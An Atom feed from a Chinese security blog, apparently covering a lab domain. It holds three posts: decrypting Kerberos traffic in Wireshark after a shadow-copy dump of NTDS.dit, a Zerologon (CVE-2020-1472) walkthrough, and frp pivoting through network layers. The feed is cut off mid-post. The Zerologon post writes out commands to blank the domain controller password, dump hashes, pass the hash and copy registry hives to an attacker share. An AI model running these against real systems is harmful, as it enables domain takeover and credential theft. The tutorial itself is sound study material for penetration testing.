<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Z4yn&#39;s blog</title>
  <icon>https://www.gravatar.com/avatar/436a77834f2add32b7dc49df6b0dbe28</icon>
  <subtitle>Better to light one candle than to curse the darkness.</subtitle>
  <link href="https://z4ynadmin.github.io/atom.xml" rel="self"/>
  
  <link href="https://z4ynadmin.github.io/"/>
  <updated>2022-11-07T06:59:08.926Z</updated>
  <id>https://z4ynadmin.github.io/</id>
  
  <author>
    <name>Z4yn&#39;s blog</name>
    <email>z4ynwanwj@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>解密Wireshark Kerberos协议</title>
    <link href="https://z4ynadmin.github.io/2022/11/07/%E8%A7%A3%E5%AF%86Wireshark-Kerberos%E5%8D%8F%E8%AE%AE/"/>
    <id>https://z4ynadmin.github.io/2022/11/07/%E8%A7%A3%E5%AF%86Wireshark-Kerberos%E5%8D%8F%E8%AE%AE/</id>
    <published>2022-11-07T06:50:26.000Z</published>
    <updated>2022-11-07T06:59:08.926Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-原始报文"><a href="#1-原始报文" class="headerlink" title="#1 原始报文"></a>#1 原始报文</h3><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/61e61014277a2683611a32ab5cac7a31.png" alt="image-20220908162617609"></p><h3 id="2-域控导出NTDS-dit和SYSTEM文件"><a href="#2-域控导出NTDS-dit和SYSTEM文件" class="headerlink" title="#2 域控导出NTDS.dit和SYSTEM文件"></a>#2 域控导出NTDS.dit和SYSTEM文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /<span class="keyword">for</span>=C:</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hive</span><br><span class="line">vssadmin delete shadows /all</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/d66f5857b61f15723e33afdcd5213463.png" alt="image-20220908162947619"></p><h3 id="3-kali安装-libesedb-utils"><a href="#3-kali安装-libesedb-utils" class="headerlink" title="#3 kali安装 libesedb-utils"></a>#3 kali安装 libesedb-utils</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> libesedb-utils</span><br></pre></td></tr></table></figure><h3 id="4-git-克隆-ntdsxtract"><a href="#4-git-克隆-ntdsxtract" class="headerlink" title="#4 git 克隆 ntdsxtract"></a>#4 git 克隆 ntdsxtract</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/csababarta/ntdsxtract.git</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/c95f93fce535f8dd4a118dcfbd6c845d.png" alt="image-20220908164711048"></p><h3 id="5-python2-安装-pycryptodome"><a href="#5-python2-安装-pycryptodome" class="headerlink" title="#5 python2 安装 pycryptodome"></a>#5 python2 安装 pycryptodome</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip <span class="keyword">install</span> pycryptodome</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/c6825d7e4ef926a122fadb194c9ee5d4.png" alt="image-20220908163452363"></p><h3 id="6-提取出多个文件，在ntds-dit-export目录下-这个步骤等待的时间较长"><a href="#6-提取出多个文件，在ntds-dit-export目录下-这个步骤等待的时间较长" class="headerlink" title="#6 提取出多个文件，在ntds.dit.export目录下  (这个步骤等待的时间较长)"></a>#6 提取出多个文件，在ntds.dit.export目录下  <strong>(这个步骤等待的时间较长)</strong></h3><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/11117420d4fa5afa32fc314c3014a20c.png" alt="image-20220908163632883"></p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/e25c82cdcf4c7066ce0df15edb81d62f.png" alt="image-20220908164504631"></p><h3 id="7-提取出-keytab文件"><a href="#7-提取出-keytab文件" class="headerlink" title="#7 提取出 keytab文件"></a>#7 提取出 keytab文件</h3><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/45617889359798fc34465d860c4a1a55.png" alt="image-20220908164816450"></p><h3 id="8-Wireshark-导入keytab文件-编辑-gt-首选项-gt-Protocols-gt-KRB5"><a href="#8-Wireshark-导入keytab文件-编辑-gt-首选项-gt-Protocols-gt-KRB5" class="headerlink" title="#8 Wireshark 导入keytab文件  编辑-&gt;首选项-&gt;Protocols-&gt;KRB5"></a>#8 Wireshark 导入keytab文件  编辑-&gt;首选项-&gt;Protocols-&gt;KRB5</h3><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/81e818b81cc454398a7bac9019ae6b18.png" alt="image-20220908164946014" style="zoom:33%;" /><h3 id="9-解密enc-part部分，就能看到-Login-session-key。"><a href="#9-解密enc-part部分，就能看到-Login-session-key。" class="headerlink" title="#9 解密enc-part部分，就能看到 Login session key。"></a>#9 解密enc-part部分，就能看到 Login session key。</h3><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/531a7ef9dbdd758a6631f5d0265a5cb9.png" alt="image-20220908165522558"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1-原始报文&quot;&gt;&lt;a href=&quot;#1-原始报文&quot; class=&quot;headerlink&quot; title=&quot;#1 原始报文&quot;&gt;&lt;/a&gt;#1 原始报文&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://z4admin.s3.ap-northeast-1.amazonaw</summary>
      
    
    
    
    
    <category term="Kerberos" scheme="https://z4ynadmin.github.io/tags/Kerberos/"/>
    
    <category term="Wireshark" scheme="https://z4ynadmin.github.io/tags/Wireshark/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1472 Netlogon权限提升</title>
    <link href="https://z4ynadmin.github.io/2022/11/07/CVE-2020-1472-Netlogon%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>https://z4ynadmin.github.io/2022/11/07/CVE-2020-1472-Netlogon%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</id>
    <published>2022-11-07T06:27:44.000Z</published>
    <updated>2022-11-07T06:41:38.882Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-目录"><a href="#0x00-目录" class="headerlink" title="# 0x00 目录"></a># 0x00 目录</h3><ol><li>漏洞分析</li><li>漏洞利用条件</li><li>漏洞利用</li></ol><hr><h3 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="# 0x01 漏洞分析"></a># 0x01 漏洞分析</h3><p>攻击者在通过NetLogon ( MS-NRPC)协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。Netlogon使用的AES认证算法中的vi向量默认为o，导致攻击者可以绕过认证，可以向域发起Netlogon计算机账户认证请求,使用8字节全0 client challenge不断尝试得到一个正确的8字节全O client credential通过认证，再通过相关调用完成对域控密码的修改。</p><p>影响版本</p><ul><li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li><li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</li><li>Windows Server 2012</li><li>Windows Server 2012 (Server Core installation)</li><li>Windows Server 2012 R2</li><li>Windows Server 2012 R2 (Server Core installation)</li><li>Windows Server 2016</li><li>Windows Server 2016 (Server Core installation)</li><li>Windows Server 2019</li><li>Windows Server 2019 (Server Core installation)</li><li>Windows Server, version 1903 (Server Core installation)</li><li>Windows Server, version 1909 (Server Core installation)</li><li>Windows Server, version 2004 (Server Core installation)</li></ul><hr><h3 id="0x02-漏洞利用条件"><a href="#0x02-漏洞利用条件" class="headerlink" title="# 0x02 漏洞利用条件"></a># 0x02 漏洞利用条件</h3><ol><li>与域控通讯（在不在域内都行）</li><li>能访问域控MS-NRPC服务，</li></ol><p>当攻击者使用Netlogon远程协议(MS-NRPC)建立与域控制器连接的易受攻击的 Netlogon安全通道时，存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络中的设备上运行经特殊设计的应用程序。</p><p>要利用此漏洞，未通过身份验证的攻击者需要将MS-NRPC连接到域控制器，以获取域管理员访问权限。</p><hr><h3 id="0x03-复现工具"><a href="#0x03-复现工具" class="headerlink" title="# 0x03 复现工具"></a># 0x03 复现工具</h3><p>漏洞验证工具：<a href="https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py">https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py</a></p><p>漏洞利用工具：<a href="https://github.com/risksense/zerologon/blob/master/set_empty_pw.py">https://github.com/risksense/zerologon/blob/master/set_empty_pw.py</a></p><p>密码重置工具：<a href="https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py">https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py</a></p><h3 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="# 0x04 漏洞复现"></a># 0x04 漏洞复现</h3><h4 id="0-漏洞验证脚本"><a href="#0-漏洞验证脚本" class="headerlink" title="0). 漏洞验证脚本"></a>0). 漏洞验证脚本</h4><p>获取dc主机名</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows：nbtstat -<span class="keyword">A</span> <span class="number">10.10.10.8</span></span><br><span class="line">Linux：nbtscan</span><br></pre></td></tr></table></figure><p>漏洞验证工具：zerologon_tester.py</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> zerologon_tester.py OWA <span class="number">10.10.10.8</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/ad4c8bc4c00f7fcc8539b0c6d69f6107.png" alt="image-20220810131156397"></p><h4 id="1-更改dc密码为空"><a href="#1-更改dc密码为空" class="headerlink" title="1).  更改dc密码为空"></a>1).  更改dc密码为空</h4><p>利用set_empty_pw.py将dc密码设置为空，即<code>31d6cfe0d16ae931b73c59d7e0c089c0</code>在利用secretsdump.py读dc的hash</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> set_empty_pw.py OWA <span class="number">10.10.10.8</span>  <span class="comment">#OWA为域控主机名</span></span><br><span class="line">impacket-secretsdump redteam.red/OWA\$@<span class="number">10.10.10.8</span> -<span class="literal">no</span>-pass</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/4a7a9f5050bc6d5e2c012d25e94ddb30.png" alt="image-20220810133549444"></p><p>获取到域管理员administrator用户hash：redteam.red\Administrator:500:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::</p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/0deb21948f62266afccca6532636e63c.png" alt="image-20220810152925651"></p><p>pth登录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">impacket</span>-wmiexec redteam.red/Administrator@<span class="number">10.10.10.8</span> -hashes :<span class="number">579</span>da<span class="number">618</span>cfbfa<span class="number">85247</span>acf<span class="number">1</span>f<span class="number">800</span>a<span class="number">280</span>a<span class="number">4</span> -codec gb<span class="number">2312</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/5ab8efe26779c0c580977b9d345a4d50.png" alt="image-20220810162528929"></p><p><strong>因为密码置空后，用户在 AD 中的密码（ntds.dic）与本地的注册表 /lsass 里面的密码不一致，会脱离域控，所以要将其恢复</strong>。</p><h4 id="2-还原密码"><a href="#2-还原密码" class="headerlink" title="2).  还原密码"></a>2).  还原密码</h4><h4 id="1-第一种方法"><a href="#1-第一种方法" class="headerlink" title="#1 第一种方法"></a>#1 第一种方法</h4><p>密码还原工具restorepassword.py：<a href="https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/restorepassword.py">https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/restorepassword.py</a></p><p>利用plain_password_hex</p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/5c3a8ee428689c54755d1ca0dd3c9525.png" alt="image-20220810143125888"></p><p>用restorepassword.py将密码还原，还原后利用空口令登录失败</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 restorepassword.py redteam.red/owa@owa -target-ip 10.10.10.8 -hexpass 595ee95117c30b874201c95971f38dd5ae0a97a564a70a366977619ea5cb3e3f18f4a4e9f3d99ec0e676e2a75594afec2ad567081ac566b118c7941e1e247a4855dd3c50edb5ed236e5cc17cf7336deb6291183f034dad603d1f475228f6d39cbea07b85335c85c554071bfa9fbc45c0f036e21e25da514c272e92db7e160d46aa1b298539cfa5f5c83773a9901983443c999e2750972f5aca71461217ecf84c7fdaca9deb1ca0000e88a587ea3aea6183db82ed5f9e66603568c2708f395e3ed96997254a8dd25b5afc06dd52c52f25e063d7b782cfa2e40667eb2bc2a4b0830f1199db0b4b4ef9ab599f983a18a567</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/aad8f7c2a28fe1f0f0ae1f0525bdc8d2.png" alt="image-20220810143023360"></p><h4 id="2-第二种方法"><a href="#2-第二种方法" class="headerlink" title="#2 第二种方法"></a>#2 第二种方法</h4><p>从注册表/lsass里面读取机器用户原先的密码，恢复AD里面的密码</p><p>利用redteam.red/administrator hash登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec redteam.red/Administrator@10.10.10.8 -hashes :579da618cfbfa85247acf1f800a280a4 -codec gb2312</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/903fb9e42a3015d99e4cca47e86eeccc.png" alt="image-20220810153151365"></p><p>读取sam、system、security文件</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">reg</span> <span class="keyword">save</span> hklm\sam sam.hive</span><br><span class="line"><span class="keyword">reg</span> <span class="keyword">save</span> hklm\system system.hive</span><br><span class="line"><span class="keyword">reg</span> <span class="keyword">save</span> hklm\security security.hive</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/acaa94a386ea3d32f427090193558e16.png" alt="image-20220810153451987"></p><p>通过SMB share复制回攻击机</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\&gt;</span>copy sam.hive <span class="symbol">\\</span>10.10.10.128<span class="symbol">\s</span>hare<span class="symbol">\s</span>am.hive</span><br><span class="line">已复制         1 个文件。</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\&gt;</span>copy security.hive <span class="symbol">\\</span>10.10.10.128<span class="symbol">\s</span>hare<span class="symbol">\s</span>ecurity.hive</span><br><span class="line">已复制         1 个文件。</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\&gt;</span>copy system.hive <span class="symbol">\\</span>10.10.10.128<span class="symbol">\s</span>hare<span class="symbol">\s</span>ystem.hive</span><br><span class="line">已复制         1 个文件。</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\&gt;</span>exit</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/cc093d005f3aedfa5facda684b6cd700.png" alt="image-20220810153845364"></p><p>或者利用impacket-smbclient链接到smb将文件下载到本地。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">impacket</span>-smbclient redteam.red/administrator@<span class="number">10.10.10.8</span> -hashes :<span class="number">579</span>da<span class="number">618</span>cfbfa<span class="number">85247</span>acf<span class="number">1</span>f<span class="number">800</span>a<span class="number">280</span>a<span class="number">4</span></span><br><span class="line"><span class="comment"># use c$</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="comment"># get sam.hive</span></span><br><span class="line"><span class="comment"># get security.hive</span></span><br><span class="line"><span class="comment"># get system.hive</span></span><br><span class="line"><span class="comment"># exit</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/b905ef8ec45562a91c609ac83ae2d1d9.png" alt="image-20220810154730324"></p><p>利用secretsdump 读取到hash</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive  -<span class="keyword">system</span> <span class="keyword">system</span>.hive  -<span class="keyword">security</span> <span class="keyword">security</span>.hive <span class="keyword">LOCAL</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/2ae82be519b899cab986509040e36729.png" alt="image-20220810160422687"></p><p>利用reinstall_original_pw.py将密码恢复。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> reinstall_original_pw.py owa <span class="number">10.10.10.8</span> <span class="number">4</span>e<span class="number">4890</span>dbf<span class="number">2</span>da<span class="number">33</span>f<span class="number">3</span>ce<span class="number">4087</span>f<span class="number">5</span>dd<span class="number">6</span>a<span class="number">4</span>dba</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/29a737488a1edfa98f9ad7bc71775279.png" alt="image-20220810160619182"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x00-目录&quot;&gt;&lt;a href=&quot;#0x00-目录&quot; class=&quot;headerlink&quot; title=&quot;# 0x00 目录&quot;&gt;&lt;/a&gt;# 0x00 目录&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;漏洞分析&lt;/li&gt;
&lt;li&gt;漏洞利用条件&lt;/li&gt;
&lt;li&gt;漏洞利用&lt;/li&gt;
</summary>
      
    
    
    
    
    <category term="CVE-2020-1472" scheme="https://z4ynadmin.github.io/tags/CVE-2020-1472/"/>
    
  </entry>
  
  <entry>
    <title>frp之一层网络代理 / 二层网络代理 / 三层网络代理</title>
    <link href="https://z4ynadmin.github.io/2022/11/04/frp%E4%B9%8B%E4%B8%80%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%BA%8C%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/"/>
    <id>https://z4ynadmin.github.io/2022/11/04/frp%E4%B9%8B%E4%B8%80%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%BA%8C%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/</id>
    <published>2022-11-04T03:05:00.000Z</published>
    <updated>2022-11-07T06:43:04.270Z</updated>
    
    <content type="html"><![CDATA[<h1 id="frp之一层网络代理-二层网络代理-三层网络代理"><a href="#frp之一层网络代理-二层网络代理-三层网络代理" class="headerlink" title="frp之一层网络代理 / 二层网络代理 / 三层网络代理"></a>frp之一层网络代理 / 二层网络代理 / 三层网络代理</h1><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/9a8daaf9a97e19adb4eb2e2aed0f0724.png" alt="image-20221103155324246"></p><h3 id="一层网络代理"><a href="#一层网络代理" class="headerlink" title="# 一层网络代理"></a># 一层网络代理</h3><p>获取10.10.10.13 Web服务器权限后搭建frp扫描DMZ区内主机。</p><ol><li>使用VPS作为FRP服务端，在VPS上执行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0    <span class="comment"># 在服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="2"><li>用Windows Server 2012作为客户端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.200    <span class="comment"># 指向frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向frp服务端绑定的端口</span></span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1080             <span class="comment"># 代理所使用的端口，会被转发到服务器</span></span><br><span class="line">plugin = socks5                <span class="comment"># 代理的类型</span></span><br></pre></td></tr></table></figure><ol start="3"><li>编辑proxychains4的配置文件：/etc/proxychains4.conf </li></ol><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png" alt="image-20221103171204998"></p><ol start="4"><li>命令前加上proxychains4</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychinas4 ssh root@10.10.10.15</span><br></pre></td></tr></table></figure><hr><h3 id="二层网络代理"><a href="#二层网络代理" class="headerlink" title="# 二层网络代理"></a># 二层网络代理</h3><p>经过在DMZ区的信息收集发现还有一个网段为192.168.30.0/24的办公区网段，利用frp在DMZ区与办公区搭建一个socks5代理。</p><ol><li>使用VPS作为frp服务端，在VPS上执行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0    <span class="comment"># 在服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="2"><li>在Windows Server 2012 上起一个frp客户端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.200    <span class="comment"># 指向frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向frp服务端绑定的端口</span></span><br><span class="line">[socks5_forward]</span><br><span class="line"><span class="built_in">type</span> = tcp                     <span class="comment"># 所使用的协议类型</span></span><br><span class="line">local_ip = 10.10.10.13         <span class="comment"># 本地监听的ip地址</span></span><br><span class="line">local_port = 10808             <span class="comment"># 要转发的本地端口</span></span><br><span class="line">remote_port = 1080             <span class="comment"># 要转发到的远程端口</span></span><br></pre></td></tr></table></figure><ol start="3"><li>在Windows Server 2012 再起一个frp服务端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\frps.exe -c .\frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.10.13    <span class="comment"># 在Windows Server 2012服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服Windows Server 2012服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="4"><li>在DMZ区的10.10.10.15 Ubuntu上执行</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.\frpc -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.13      <span class="comment"># 指向Windows Server 2012 frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向Windows Server 2012 frp服务端绑定的端口</span></span><br><span class="line">[socks5]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 10808            <span class="comment"># 代理所使用的端口，会被转发到服务器</span></span><br><span class="line">plugin = socks5                <span class="comment"># 代理的类型</span></span><br></pre></td></tr></table></figure><ol start="5"><li>编辑proxychains4的配置文件：/etc/proxychains4.conf </li></ol><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png" alt="image-20221103171204998"></p><ol start="6"><li>命令前加上proxychains4</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychinas4 rdesktop 192.168.30.20</span><br></pre></td></tr></table></figure><hr><h3 id="三层网络代理"><a href="#三层网络代理" class="headerlink" title="# 三层网络代理"></a># 三层网络代理</h3><p>通过代理访问到核心区的<strong>192.168.60.10域控制器</strong></p><ol><li>使用VPS作为frp服务端，在VPS上执行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0    <span class="comment"># 在VPS上的FRP服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在VPS上的FRP服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="2"><li>在Windows Server 2012 上执行以下命令：</li></ol><p>启动frp客户端，将本地端口10808转发到VPS的1080端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端配置文件frpc.ini的内容如下</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.200    <span class="comment"># 指向VPS上frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向VPS上frp服务端绑定的端口</span></span><br><span class="line">[socks5_forward]</span><br><span class="line"><span class="built_in">type</span> = tcp                     <span class="comment"># 所使用的协议类型</span></span><br><span class="line">local_ip = 10.10.10.13         <span class="comment"># 本地监听的ip地址</span></span><br><span class="line">local_port = 10808             <span class="comment"># 要转发的本地端口</span></span><br><span class="line">remote_port = 1080             <span class="comment"># 要转发到的远程端口</span></span><br></pre></td></tr></table></figure><ol start="3"><li>在Windows Server 2012 再起一个frp服务端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\frps.exe -c .\frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.10.13    <span class="comment"># 